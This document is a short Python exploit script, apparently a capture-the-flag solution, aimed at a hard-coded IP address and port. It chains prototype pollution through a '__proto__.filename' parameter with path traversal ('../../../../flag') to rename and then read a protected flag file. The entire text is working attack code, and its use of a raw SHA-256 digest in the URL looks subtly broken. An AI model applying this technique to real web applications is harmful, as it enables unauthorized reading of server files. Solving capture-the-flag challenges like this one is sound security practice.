import requests
import hashlib

url= "http://13.213.74.71:31487"
data = {"filename": "bb", "content":"content"}

hash_filename = hashlib.sha256(b"bb").digest()

# the file generation
res = requests.get(url, data=data)

# prototype pollution
res = requests.get(url + "/test/?func=rename&filename={}.__proto__.filename&rename=../../../../../../../../flag".format(hash_filename))

# reset
res = requests.get(url + "/test/?func=reset")

# get flag
res = requests.get(url + "/readfile")

print(res.text)